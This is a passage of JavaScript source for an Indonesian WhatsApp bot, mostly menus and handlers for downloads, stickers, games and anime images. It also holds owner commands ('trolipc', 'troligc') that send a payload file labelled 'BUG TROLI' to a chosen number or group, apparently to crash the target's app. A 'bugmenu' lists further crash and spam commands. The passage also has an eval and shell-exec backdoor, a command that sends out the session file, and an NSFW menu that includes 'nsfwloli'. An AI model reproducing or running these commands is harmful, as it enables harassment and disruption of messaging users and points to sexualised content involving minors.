			{ quickReplyButton: { displayText: `Next`, id: `${command}` } },
			{ quickReplyButton: { displayText: `Donasi 💌`, id: `${couple}` } },
			]
		alfa.sendMessage(m.chat, {caption: `*Nih Kk*`, video: {url: hasil}, templateButtons: quot}, { quoted: m } )
		break
			case 'list': case 'help': case '?': {
			kontol = await fetchJson(`https://leyscoders-api.herokuapp.com/api/count-date?tgl=9&bln=jul&thn=2022&apikey=dappakntlll`)
			meme = await fetchJson(`https://leyscoders-api.herokuapp.com/api/time?apikey=dappakntlll`)
anu = `*Hai Kk ${pushname} 👋, Saya Adalah Bot Whatsapp Yang Bisa Membantu Anda*
────────────────────
_Nama User : ${pushname}_
_Nama Bot: ${bot}_
_Nama Owner: ${copy}_
────────────────────
*WIB:* _${meme.result.wib}_
*WITA:* _${meme.result.wita}_
*WIT:* _${meme.result.wit}_
────────────────────
_Hitung Mundur Idul Adha:_\n${kontol.result}
────────────────────`
				let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}, {
								urlButton: {
									displayText: 'My Github 🔥',
									url: 'https://www.github.com/ManzTzy1'
								}
							}, {
								quickReplyButton: {
									displayText: 'Thanks To 📌',
									id: 'thx'
								}
							}, {
								quickReplyButton: {
									displayText: 'Rules Bot',
									id: 'sdk'
								}
							}, {
								quickReplyButton: {
									displayText: 'All Menu 🎀',
									id: 'allmenu'
								}
							}]
						 let setbot = db.data.settings[botNumber]
						if (setbot.templateImage) {
						alfa.send5ButImg(m.chat, anu, global.copy, global.thumb, btn)
						} else if (setbot.templateGif) {
						alfa.send5ButGif(m.chat, anu, global.copy, global.visoka, btn)
						} else if (setbot.templateVid) {
						alfa.send5ButVid(m.chat, anu, global.copy, global.visoka, btn)
						} else if (setbot.templateMsg) {
						alfa.send5ButMsg(m.chat, anu, global.copy, btn)
						}
						}
			break

case 'sendsesi': {
if (!isCreator) return m.reply(man.kus)
alfa.sendMessage(m.chat, {document: fs.readFileSync('./session.json'), mimetype: 'javascript/json', fileName: `${sessionName}.json`}, {quoted:ftrol})
}
break
// Created By Manz Executed
case 'hhg': {
let timestamp = speed()
let latensi = speed() - timestamp
const botzkir = "6283846819169@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
mbc = `Hai Kak @${m.sender.split("@")[0]} 
Saya ManzExecuted Saya Disini Ingin Membantu Kalian Membuat Sticker Download Video/Lagu Youtube, Tiktok Dll.`
let buttons = [
{buttonId: `${prefix}rpgmenu`, buttonText: {displayText: 'Rpg Menu'}, type: 1},
{buttonId: `${prefix}allmenu`, buttonText: {displayText: 'All Menu'}, type: 1}
]
let buttonMessage = {
document: fs.readFileSync('./lib/thx.jpg'), 
fileName: `Bot By Manz`, 
mimetype: `application/${bykir}`,
jpegThumbnail: thumb,
caption: mbc,
fileLength: "100000000000000000",
mentions:[m.sender, botzkir],
footer: `_Powered By @${botzkir.split("@")[0]}_`,
buttons: buttons,
headerType: 4,
contextInfo: {
"mentionedJid": [m.sender, botzkir],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnya,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/p7px7u_1NI8',
"sourceUrl": 'https://chat.whatsapp.com/CswK4kvQD1u7SfSmsYfMHZ'
}}
}
alfa.sendMessage(m.chat, buttonMessage, { quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`,
				   remoteJid: "6281903153426-1626053991@g.us"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 99999999,
				    status: 1,
				    surface: 1,
				    message: 'Created By Manz Executed',
				    orderTitle: '999999999', 
				    sellerJid: `0@s.whatsapp.net` 
				   }
				  }
				 } })
				 }
break
case 'trolipc': {
if (!isCreator) return m.reply(man.kus)
if (!q) return m.reply('Masukan Nomor Contoh: 62813xxxx')
 if (!q.includes('62')) return m.reply('Masukan Nomor Dengan Awal 62')
 var number = text.split('|')[0] ? text.split('|')[0] : '-'
let man = fs.readFileSync(`./manz/tes.txt`)
alfa.sendOrder(`${number}@s.whatsapp.net`, man, {quoted: m} )
anu = '```SUCCES SEND BUG TROLI PC```'
let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}]
							alfa.send5ButMsg(m.chat, anu, global.copy, btn)
}
break
case 'troligc': {
if (!isCreator) return m.reply(man.kus)
if (!q) throw 'Masukan Id Grup, Kalo Belum Tau Dapet Id Grup Nya Bisa Ketik:\n\n> m.chat\n\nDi Dalam Grup'
 var number = text.split('|')[0] ? text.split('|')[0] : '-'
let man = fs.readFileSync(`./manz/tes.txt`)
alfa.sendOrder(`${number}`, man, {quoted: m} )
anu = '```SUCCES SEND BUG TROLI GC```'
let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}]
							alfa.send5ButMsg(m.chat, anu, global.copy, btn)
}
break
case 'menu':
let timestamp = speed()
let latensi = speed() - timestamp
kontol = await fetchJson(`https://leyscoders-api.herokuapp.com/api/count-date?tgl=9&bln=jul&thn=2022&apikey=dappakntlll`)
			meme = await fetchJson(`https://leyscoders-api.herokuapp.com/api/time?apikey=dappakntlll`)
const botzkir = "6281327496283@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
mbc = `*Selamat ${salam} Kk @${m.sender.split("@")[0]} Saya ${bot} Bisa Membantu Download Video Tiktok/Download Lagu Dll*
*WIB:* _${meme.result.wib}_
*WITA:* _${meme.result.wita}_
*WIT:* _${meme.result.wit}_

Jika Menu Nya Tidak Mau Muncul Ketik ${prefix}AllMenu Ya Kk @${m.sender.split("@")[0]}`
let buttons = [
{buttonId: `${prefix}thx`, buttonText: {displayText: 'Thanks To 📌'}, type: 1},
{buttonId: `${prefix}man`, buttonText: {displayText: 'All Menu'}, type: 1}
]
let buttonMessage = {
document: fs.readFileSync('./lib/thx.jpg'), 
fileName: `𝑴𝒂𝒏𝒛 𝑻𝒛𝒚`, 
mimetype: `application/${bykir}`,
jpegThumbnail: thumb,
caption: mbc,
fileLength: "100000000000000000",
mentions:[m.sender, botzkir],
footer: `_Bot By @${botzkir.split("@")[0]}_`,
buttons: buttons,
headerType: 4,
contextInfo: {
"mentionedJid": [m.sender, botzkir],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnya,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/p7px7u_1NI8',
"sourceUrl": 'https://chat.whatsapp.com/CswK4kvQD1u7SfSmsYfMHZ'
}}
}
alfa.sendMessage(m.chat, buttonMessage, { quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`,
				   remoteJid: "6281327496283-1626053991@g.us"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 99999999,
				    status: 1,
				    surface: 1,
				    message: '𝑴𝒂𝒏𝒛 𝑻𝒛𝒚',
				    orderTitle: '99999999', 
				    sellerJid: `0@s.whatsapp.net` 
				   }
				  }
				 } })
break
case 'thx': { 
asu = `*「 THANKS TO 」*\n➤ *Allah Subhanahu Wa Ta'ala*\n➤ *My Ortu*\n➤ *Manz Tzy (GWEHH)*\n➤ *Kir Botz (MASTAH)*\n➤ *Dika Ardnt (YG PNYA BASE)*\n➤ *Frmn Tzy (MASTAH)*\n➤ *ars_TURU (ORG NEMU DI JALAN)*\n➤ *Penyedia Rest Api*\n➤ *Yang Support Gua*`
const men = ['loc1','loc2','loc3']
const rndmmenu =  men[Math.floor(Math.random() * (men.length))]
const tamnel = await reSize(`./media/${rndmmenu}.png`, 200, 200)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
hydratedContentText : asu, 
locationMessage: {
jpegThumbnail: tamnel},
hydratedFooterText: ' ', 
hydratedButtons: [{
urlButton: {
displayText: 'My Owner 🖤',
url: 'https://wa.me/6281327496283'
}
}, {
urlButton: {
displayText: 'My Github 🔥',
url: 'https://github.com/CilentTeam'
}
}, {
quickReplyButton: {
displayText: 'Speed Bot',
id: '#ping'
}
}, {
quickReplyButton: {
displayText: 'Donasi',
id: '#donate'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
alfa.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'allmenu': {
let hit = 0
listmenu = `
*Menu Group 👥* 

${hit+=1}. ${prefix}linkgroup
${hit+=1}. ${prefix}ephemeral [option]
${hit+=1}. ${prefix}setppgc [image]
${hit+=1}. ${prefix}setname [text]
${hit+=1}. ${prefix}setdesc [text]
${hit+=1}. ${prefix}group [option]
${hit+=1}. ${prefix}editinfo [option]
${hit+=1}. ${prefix}add @user
${hit+=1}. ${prefix}out [kick member] @user
${hit+=1}. ${prefix}hidetag [text]
${hit+=1}. ${prefix}tagall [text]
${hit+=1}. ${prefix}antilink [on/off]
${hit+=1}. ${prefix}mute [on/off]
${hit+=1}. ${prefix}promote @user
${hit+=1}. ${prefix}demote @user
${hit+=1}. ${prefix}vote [text]
${hit+=1}. ${prefix}devote
${hit+=1}. ${prefix}upvote
${hit+=1}. ${prefix}cekvote
${hit+=1}. ${prefix}hapusvote




*Downloader Menu 📌* 

${hit+=1}. ${prefix}tiktoknowm [url]
${hit+=1}. ${prefix}ttmp3 [url]
${hit+=1}. ${prefix}instagram [url]
${hit+=1}. ${prefix}twitter [url]
${hit+=1}. ${prefix}twittermp3 [url]
${hit+=1}. ${prefix}facebook [url]
${hit+=1}. ${prefix}pinterestdl [url]
${hit+=1}. ${prefix}ytmp3 [url]
${hit+=1}. ${prefix}ytmp4 [url]
${hit+=1}. ${prefix}getmusic [query]
${hit+=1}. ${prefix}getvideo [query]
${hit+=1}. ${prefix}umma [url]
${hit+=1}. ${prefix}joox [query]
${hit+=1}. ${prefix}soundcloud [url]




*Search Menu 🔍* 

${hit+=1}. ${prefix}play [query]
${hit+=1}. ${prefix}yts [query]
${hit+=1}. ${prefix}google [query]
${hit+=1}. ${prefix}gimage [query]
${hit+=1}. ${prefix}pinterest [query]
${hit+=1}. ${prefix}wallpaper [query]
${hit+=1}. ${prefix}wikimedia [query]
${hit+=1}. ${prefix}ytsearch [query]
${hit+=1}. ${prefix}ringtone [query]
${hit+=1}. ${prefix}nhentai [kode nya]
${hit+=1}. ${prefix}cekip [query]
${hit+=1}. ${prefix}kusonime [query]




*Random Menu 📍* 

${hit+=1}. ${prefix}coffe
${hit+=1}. ${prefix}quotesanime
${hit+=1}. ${prefix}couple




*Text Menu 🗿* 

${hit+=1}. ${prefix}katailham
${hit+=1}. ${prefix}quotes
${hit+=1}. ${prefix}quotesanime
${hit+=1}. ${prefix}faktaunik
${hit+=1}. ${prefix}fml
${hit+=1}. ${prefix}cerpen
${hit+=1}. ${prefix}dare
${hit+=1}. ${prefix}katagalau




*Fun Menu 🎪* 

${hit+=1}. ${prefix}simih
${hit+=1}. ${prefix}halah
${hit+=1}. ${prefix}hilih
${hit+=1}. ${prefix}huluh
${hit+=1}. ${prefix}heleh
${hit+=1}. ${prefix}holoh
${hit+=1}. ${prefix}jadian
${hit+=1}. ${prefix}jodohku
${hit+=1}. ${prefix}delttt
${hit+=1}. ${prefix}tictactoe
${hit+=1}. ${prefix}family100
${hit+=1}. ${prefix}tebak [option]
${hit+=1}. ${prefix}math [mode]
${hit+=1}. ${prefix}suitpvp [@tag]




*Primbon Menu ⭐* 

${hit+=1}. ${prefix}nomorhoki
${hit+=1}. ${prefix}artimimpi
${hit+=1}. ${prefix}artinama
${hit+=1}. ${prefix}ramaljodoh
${hit+=1}. ${prefix}ramaljodohbali
${hit+=1}. ${prefix}suamiistri
${hit+=1}. ${prefix}ramalcinta
${hit+=1}. ${prefix}cocoknama
${hit+=1}. ${prefix}pasangan
${hit+=1}. ${prefix}jadiannikah
${hit+=1}. ${prefix}sifatusaha
${hit+=1}. ${prefix}rezeki
${hit+=1}. ${prefix}pekerjaan
${hit+=1}. ${prefix}nasib
${hit+=1}. ${prefix}penyakit
${hit+=1}. ${prefix}tarot
${hit+=1}. ${prefix}fengshui
${hit+=1}. ${prefix}haribaik
${hit+=1}. ${prefix}harisangar
${hit+=1}. ${prefix}harisial
${hit+=1}. ${prefix}nagahari
${hit+=1}. ${prefix}arahrezeki
${hit+=1}. ${prefix}peruntungan
${hit+=1}. ${prefix}weton
${hit+=1}. ${prefix}karakter
${hit+=1}. ${prefix}keberuntungan
${hit+=1}. ${prefix}memancing
${hit+=1}. ${prefix}masasubur
${hit+=1}. ${prefix}zodiak
${hit+=1}. ${prefix}shio




*Convert Menu ⚙️*

${hit+=1}. ${prefix}attp
${hit+=1}. ${prefix}ttp
${hit+=1}. ${prefix}toimage
${hit+=1}. ${prefix}removebg
${hit+=1}. ${prefix}sticker
${hit+=1}. ${prefix}emojimix
${hit+=1}. ${prefix}emojimix2
${hit+=1}. ${prefix}tovideo
${hit+=1}. ${prefix}togif
${hit+=1}. ${prefix}tourl
${hit+=1}. ${prefix}tovn
${hit+=1}. ${prefix}tomp3
${hit+=1}. ${prefix}toaudio
${hit+=1}. ${prefix}ebinary
${hit+=1}. ${prefix}dbinary
${hit+=1}. ${prefix}styletext
${hit+=1}. ${prefix}smeme




*Main Menu 📡 *

${hit+=1}. ${prefix}ping
${hit+=1}. ${prefix}owner
${hit+=1}. ${prefix}menu / ${prefix}help / ${prefix}?
${hit+=1}. ${prefix}delete
${hit+=1}. ${prefix}infochat
${hit+=1}. ${prefix}quoted
${hit+=1}. ${prefix}listpc
${hit+=1}. ${prefix}listgc
${hit+=1}. ${prefix}listonline
${hit+=1}. ${prefix}surat 62xxx
${hit+=1}. ${prefix}speedtest
${hit+=1}. ${prefix}report [text]




*Database Menu 📁*

${hit+=1}. ${prefix}setcmd
${hit+=1}. ${prefix}listcmd
${hit+=1}. ${prefix}delcmd
${hit+=1}. ${prefix}lockcmd
${hit+=1}. ${prefix}addmsg
${hit+=1}. ${prefix}listmsg
${hit+=1}. ${prefix}getmsg
${hit+=1}. ${prefix}delmsg




*Anonymous Menu 🎭* 

${hit+=1}. ${prefix}anonymous
${hit+=1}. ${prefix}start
${hit+=1}. ${prefix}next
${hit+=1}. ${prefix}keluar




*Islamic Menu 🕋* 

${hit+=1}. ${prefix}iqra
${hit+=1}. ${prefix}hadist
${hit+=1}. ${prefix}alquran
${hit+=1}. ${prefix}juzamma
${hit+=1}. ${prefix}tafsirsurah




*Voice Changer 🎧* 

${hit+=1}. ${prefix}bass
${hit+=1}. ${prefix}blown
${hit+=1}. ${prefix}deep
${hit+=1}. ${prefix}earrape
${hit+=1}. ${prefix}fast
${hit+=1}. ${prefix}fat
${hit+=1}. ${prefix}nightcore
${hit+=1}. ${prefix}reverse
${hit+=1}. ${prefix}robot
${hit+=1}. ${prefix}slow
${hit+=1}. ${prefix}tupai




*Owner Menu 👑* 

${hit+=1}. ${prefix}react [emoji]
${hit+=1}. ${prefix}chat [option]
${hit+=1}. ${prefix}join [link]
${hit+=1}. ${prefix}leave
${hit+=1}. ${prefix}block @user
${hit+=1}. ${prefix}unblock @user
${hit+=1}. ${prefix}bcgroup [text]
${hit+=1}. ${prefix}bcall [text]
${hit+=1}. ${prefix}setppbot [image]
${hit+=1}. ${prefix}setexif
${hit+=1}. ${prefix}setmenu [option]
${hit+=1}. ${prefix}bugpc 628xxx|kontol|5|5s
${hit+=1}. ${prefix}gc 120363025641317889@g.us|kontol|5|5s
${hit+=1}. ${prefix}spam 628xxx|5|5s
${hit+=1}. ${prefix}Catalog <628xxx|jumlah|waktu>
${hit+=1}. ${prefix}bugkontak 628×××|5|5s



*List Menu 🌈*

${hit+=1}. ${prefix}menuanime
${hit+=1}. ${prefix}menunsfw
${hit+=1}. ${prefix}randoms




*Random Image Anime 🌀*

${hit+=1}. ${prefix}storyanime
${hit+=1}. ${prefix}waifu
${hit+=1}. ${prefix}waifu2
${hit+=1}. ${prefix}loli
${hit+=1}. ${prefix}yotsuba
${hit+=1}. ${prefix}minato
${hit+=1}. ${prefix}kurumi
${hit+=1}. ${prefix}sagiri
${hit+=1}. ${prefix}megumin
${hit+=1}. ${prefix}miku
${hit+=1}. ${prefix}onepice
${hit+=1}. ${prefix}shinomiya
${hit+=1}. ${prefix}yumeko
${hit+=1}. ${prefix}tejina
${hit+=1}. ${prefix}boruto
${hit+=1}. ${prefix}kotori
${hit+=1}. ${prefix}eren
${hit+=1}. ${prefix}kaori
${hit+=1}. ${prefix}shizuka
${hit+=1}. ${prefix}tsunade
${hit+=1}. ${prefix}chiho
${hit+=1}. ${prefix}kaga
${hit+=1}. ${prefix}akiyama
${hit+=1}. ${prefix}gremory
${hit+=1}. ${prefix}isuzu
${hit+=1}. ${prefix}shina
${hit+=1}. ${prefix}kagura
${hit+=1}. ${prefix}shinka
${hit+=1}. ${prefix}eba
${hit+=1}. ${prefix}elaina
${hit+=1}. ${prefix}yuri
${hit+=1}. ${prefix}erza
${hit+=1}. ${prefix}hinata
${hit+=1}. ${prefix}naruto
${hit+=1}. ${prefix}nezuko
${hit+=1}. ${prefix}rize
${hit+=1}. ${prefix}anna
${hit+=1}. ${prefix}deidara
${hit+=1}. ${prefix}yuki
${hit+=1}. ${prefix}asuna
${hit+=1}. ${prefix}ayuzawa
${hit+=1}. ${prefix}chitoge
${hit+=1}. ${prefix}emilia
${hit+=1}. ${prefix}hestia
${hit+=1}. ${prefix}inori
${hit+=1}. ${prefix}itachi
${hit+=1}. ${prefix}madara
${hit+=1}. ${prefix}sakura
${hit+=1}. ${prefix}sasuke
${hit+=1}. ${prefix}tsunade
${hit+=1}. ${prefix}keneki
${hit+=1}. ${prefix}toukachan
${hit+=1}. ${prefix}akira
${hit+=1}. ${prefix}itori
${hit+=1}. ${prefix}pokemon



*Sewa Bot ⚡*

${hit+=1}. ${prefix}sewabot
${hit+=1}. ${prefix}buybot
${hit+=1}. ${prefix}buyprem




*Menu 18+ 🔞* 

${hit+=1}. ${prefix}vidnekopoi
${hit+=1}. ${prefix}nekopoidl [url]
${hit+=1}. ${prefix}xnxxsearch [text]
${hit+=1}. ${prefix}xnxxdl [url]
${hit+=1}. ${prefix}xnxxdlhd [url]




*Menu Nsfw 🔞*

${hit+=1}. ${prefix}ahegao
${hit+=1}. ${prefix}ass
${hit+=1}. ${prefix}nsfwloli
${hit+=1}. ${prefix}bdsm
${hit+=1}. ${prefix}hentai
${hit+=1}. ${prefix}yuri
${hit+=1}. ${prefix}neko
${hit+=1}. ${prefix}neko2
${hit+=1}. ${prefix}ero
${hit+=1}. ${prefix}cuckold
${hit+=1}. ${prefix}cum
${hit+=1}. ${prefix}zettai
${hit+=1}. ${prefix}foot
${hit+=1}. ${prefix}femdom
${hit+=1}. ${prefix}galsses
${hit+=1}. ${prefix}panties
${hit+=1}. ${prefix}orgy
${hit+=1}. ${prefix}manga
${hit+=1}. ${prefix}gangbang
${hit+=1}. ${prefix}jahy
${hit+=1}. ${prefix}tentacles
${hit+=1}. ${prefix}thighs
${hit+=1}. ${prefix}pussy
${hit+=1}. ${prefix}ecchi




*Random Sticker Anime 👾*

${hit+=1}. ${prefix}poke  
${hit+=1}. ${prefix}bully  
${hit+=1}. ${prefix}cuddle  
${hit+=1}. ${prefix}cry  
${hit+=1}. ${prefix}hug  
${hit+=1}. ${prefix}awoo  
${hit+=1}. ${prefix}kiss  
${hit+=1}. ${prefix}lick  
${hit+=1}. ${prefix}pat  
${hit+=1}. ${prefix}smug  
${hit+=1}. ${prefix}bonk  
${hit+=1}. ${prefix}yeet  
${hit+=1}. ${prefix}blush  
${hit+=1}. ${prefix}smile  
${hit+=1}. ${prefix}wave  
${hit+=1}. ${prefix}highfive  
${hit+=1}. ${prefix}handhold  
${hit+=1}. ${prefix}nom  
${hit+=1}. ${prefix}bite  
${hit+=1}. ${prefix}glomp  
${hit+=1}. ${prefix}slap  
${hit+=1}. ${prefix}kill  
${hit+=1}. ${prefix}kick  
${hit+=1}. ${prefix}happy  
${hit+=1}. ${prefix}wink  
${hit+=1}. ${prefix}dance  
${hit+=1}. ${prefix}cringe`
const men = ['loc1','loc2','loc3']
const rndmmenu =  men[Math.floor(Math.random() * (men.length))]
const tamnel = await reSize(`./media/${rndmmenu}.png`, 200, 200)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
hydratedContentText : listmenu, 
locationMessage: {
jpegThumbnail: tamnel},
hydratedFooterText: ' ', 
hydratedButtons: [{
urlButton: {
displayText: 'My Owner 🖤',
url: 'https://wa.me/6281327496283'
}
}, {
urlButton: {
displayText: 'My Github 🔥',
url: 'https://github.com/CilentTeam'
}
}, {
quickReplyButton: {
displayText: 'Speed Bot',
id: '#ping'
}
}, {
quickReplyButton: {
displayText: 'Donasi',
id: '#donate'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
alfa.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'bugmenu': {
let hit = 0

let own = `
${hit+=1}. ${prefix}bugpc 628xxx|kontol|5|5s
${hit+=1}. ${prefix}gc 120363025641317889@g.us|kontol|5|5s
${hit+=1}. ${prefix}spam 628xxx|5|5s
${hit+=1}. ${prefix}Catalog <628xxx|jumlah|waktu>
${hit+=1}. ${prefix}bugkontak 628×××|5|5s
${hit+=1}. ${prefix}vanh
`
const men = ['loc1','loc2','loc3']
const rndmmenu =  men[Math.floor(Math.random() * (men.length))]
const tamnel = await reSize(`./media/${rndmmenu}.png`, 200, 200)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
hydratedContentText : own, 
locationMessage: {
jpegThumbnail: tamnel},
hydratedFooterText: ' ', 
hydratedButtons: [{
urlButton: {
displayText: 'My Owner 🖤',
url: 'https://wa.me/6281327496283'
}
}, {
urlButton: {
displayText: 'My Github 🔥',
url: 'https://github.com/CilentTeam'
}
}, {
quickReplyButton: {
displayText: 'Speed Bot',
id: '#ping'
}
}, {
quickReplyButton: {
displayText: 'Donasi',
id: '#donate'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
alfa.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'randoms': {
let sections = [
                {
                title: "RANDOM STICKER ANIME 👾",
                rows: [
                {title: "Poke", rowId: 'poke'},
                {title: "Cuddle", rowId: 'cuddle'},
                {title: "Bully", rowId: 'bully'},
                {title: "Cry", rowId: 'cry'},
                {title: "Hug", rowId: 'hug'},
                {title: "Awoo", rowId: 'awoo'},
                {title: "Kiss", rowId: 'kiss'},
                {title: "Lick", rowId: 'lick'},
                {title: "Pat", rowId: 'pat'},
                {title: "Smug", rowId: 'smug'},
                {title: "Bonk", rowId: 'bonk'},
                {title: "Yeet", rowId: 'yeet'},
                {title: "Blush", rowId: 'blush'},
                {title: "Smile", rowId: 'smile'},
                {title: "Wave", rowId: 'wave'},
                {title: "High Five", rowId: 'highfive'},
                {title: "Hand Hold", rowId: 'handhold'},
               {title: "Nom", rowId: 'nom'},
                {title: "Bite", rowId: 'bite'},
                {title: "Glomp", rowId: 'glomp'},
                {title: "Slap", rowId: 'slap'},
                {title: "Kill", rowId: 'kill'},
                {title: "Kick", rowId: 'kick'},
                {title: "Happy", rowId: 'happy'},
                {title: "Wink", rowId: 'wink'},
                {title: "Dance", rowId: 'dance'},
                {title: "Cringe", rowId: 'cringe'},
                ]},
				{
				title: "PERANCANG BOT",
				rows: [
				{title: "My Owner", rowId: 'owner', description: 'Nomor Pembuat Bot'},
				{title: "Rules Bot", rowId: 'sdk', description: 'Menampilkan Peraturan Penggunaan Bot'},
				{title: "Contributor Bot", rowId: 'thx', description: 'Menampilkan Perancang Script Akari Bot'},
				]
                },
                ]
                alfa.sendListMsg(m.chat, `List Menu Random Sticker Anime 👾`, global.ownmy, `Haii Kk ${pushname}`, `Click Here 👋`, sections, m)
            }
            break
case 'kkk': {
nsfw = `*Menu Nsfw 🔞*

${hit+=1}. ${prefix}ahegao
${hit+=1}. ${prefix}ass
${hit+=1}. ${prefix}nsfwloli
${hit+=1}. ${prefix}bdsm
${hit+=1}. ${prefix}hentai
${hit+=1}. ${prefix}yuri
${hit+=1}. ${prefix}neko
${hit+=1}. ${prefix}neko2
${hit+=1}. ${prefix}ero
${hit+=1}. ${prefix}cuckold
${hit+=1}. ${prefix}cum
${hit+=1}. ${prefix}zettai
${hit+=1}. ${prefix}foot
${hit+=1}. ${prefix}femdom
${hit+=1}. ${prefix}galsses
${hit+=1}. ${prefix}panties
${hit+=1}. ${prefix}orgy
${hit+=1}. ${prefix}manga
${hit+=1}. ${prefix}gangbang
${hit+=1}. ${prefix}jahy
${hit+=1}. ${prefix}tentacles
${hit+=1}. ${prefix}thighs
${hit+=1}. ${prefix}pussy
${hit+=1}. ${prefix}ecchi`
let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}, {
								urlButton: {
									displayText: 'My YouTube ⚡',
									url: 'https://www.youtube.com/MamzTzy'
								}
							}, {
								quickReplyButton: {
									displayText: 'Thanks To 📌',
									id: 'thx'
								}
							}, {
								quickReplyButton: {
									displayText: 'List Menu Nya 🌈',
									id: 'manu'
								}
							}]
							alfa.send5ButMsg(m.chat, nsfw, global.copy, btn)
}
break
case 'menuanime': {
let sections = [
				{
				title: "Random Anime 🌛",
				rows: [
				{title: "Story Anime", rowId: 'storyanime', description: 'Random Video Anime'},
				{title: "Waifu", rowId: 'waifu'},
				{title: "Waifu2", rowId: 'waifu2'},
				{title: "loli", rowId: 'loli'},
				{title: "Yotsuba", rowId: 'yotsuba'},
				{title: "Minato", rowId: 'minato'},
				{title: "Kurumi", rowId: 'kurumi'},
				{title: "Sagiri", rowId: 'sagiri'},
				{title: "Megumin", rowId: 'megumin'},
				{title: "Miku", rowId: 'miku'},
				{title: "One Pice", rowId: 'onepice'},
				{title: "Shinomiya", rowId: 'shinomiya'},
				{title: "Yumeko", rowId: 'yumeko'},
				{title: "Boruto", rowId: 'boruto'},
				{title: "Tejina", rowId: 'tejina'},
				{title: "Kotori", rowId: 'kotori'},
				{title: "Eren", rowId: 'eren'},
				{title: "Kaori", rowId: 'kaori'},
				{title: "Shizuka", rowId: 'shizuka'},
				{title: "Touka Chan", rowId: 'toukachan'},
				{title: "Chiho", rowId: 'chiho'},
				{title: "Kaga", rowId: 'kaga'},
				{title: "Akiyama", rowId: 'akiyama'},
				{title: "Gremory", rowId: 'gremory'},
				{title: "Isuzu", rowId: 'isuzu'},
				{title: "Kagura", rowId: 'kagura'},
				{title: "Shina", rowId: 'shina'},
				{title: "Shinka", rowId: 'shinka'},
				{title: "eba", rowId: 'eba'},
				{title: "Elaina", rowId: 'Elaina'},
				{title: "Yuri", rowId: 'yuri'},
				{title: "Erza", rowId: 'erza'},
				{title: "Hinata", rowId: 'hinata'},
				{title: "Chitoge", rowId: 'chitoge'},
				{title: "Rize", rowId: 'rize'},
				{title: "Anna", rowId: 'anna'},
				{title: "Deidara", rowId: 'deidara'},
				{title: "Yuki", rowId: 'yuki'},
				{title: "Asuna", rowId: 'asuna'},
				{title: "Naruto", rowId: 'naruto'},
				{title: "Nezuko", rowId: 'nezuko'},
				{title: "Ayuzawa", rowId: 'ayuzawa'},
				{title: "Emilia", rowId: 'emilia'},
				{title: "Hestia", rowId: 'hestia'},
				{title: "Inori", rowId: 'inori'},
				{title: "Itachi", rowId: 'itachi'},
				{title: "Madara", rowId: 'madara'},
				{title: "Sasuke", rowId: 'sasuke'},
				{title: "Tsunade", rowId: 'tsunade'},
				{title: "Akira", rowId: 'akira'},
				{title: "Itori", rowId: 'itori'},
				{title: "Pokemon", rowId: 'pokemon'},
				]},
				{
				title: "PERANCANG BOT",
				rows: [
				{title: "My Owner", rowId: 'owner', description: 'Nomor Pembuat Bot'},
				{title: "Rules Bot", rowId: 'sdk', description: 'Menampilkan Peraturan Penggunaan Bot'},
				{title: "Contributor Bot", rowId: 'thx', description: 'Menampilkan Perancang Script Akari Bot'},
				]
				},
				]
				alfa.sendListMsg(m.chat, `List Menu Image Random Anime 🌛 Nya Ada Di Bawah`, global.ownmy, `Haii Kk ${pushname}`, `Click Here 🖤`, sections, m)
			}
			break
			default:
				if (budy.startsWith('=>')) {
					if (!isCreator) return m.reply(man.kus)
					function Return(sul) {
						sat = JSON.stringify(sul, null, 2)
						bang = util.format(sat)
							if (sat == undefined) {
								bang = util.format(sul)
							}
							return m.reply(bang)
					}
					try {
						m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
					} catch (e) {
						m.reply(String(e))
					}
				}

				if (budy.startsWith('>')) {
					if (!isCreator) return m.reply(man.kus)
					try {
						let evaled = await eval(budy.slice(2))
						if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
						await m.reply(evaled)
					} catch (err) {
						await m.reply(String(err))
					}
				}

				if (budy.startsWith('$')) {
					if (!isCreator) return m.reply(man.kus)
					exec(budy.slice(2), (err, stdout) => {
						if(err) return m.reply(err)
						if (stdout) return m.reply(stdout)
					})
				}
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
					this.anonymous = this.anonymous ? this.anonymous : {}
					let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
					if (room) {
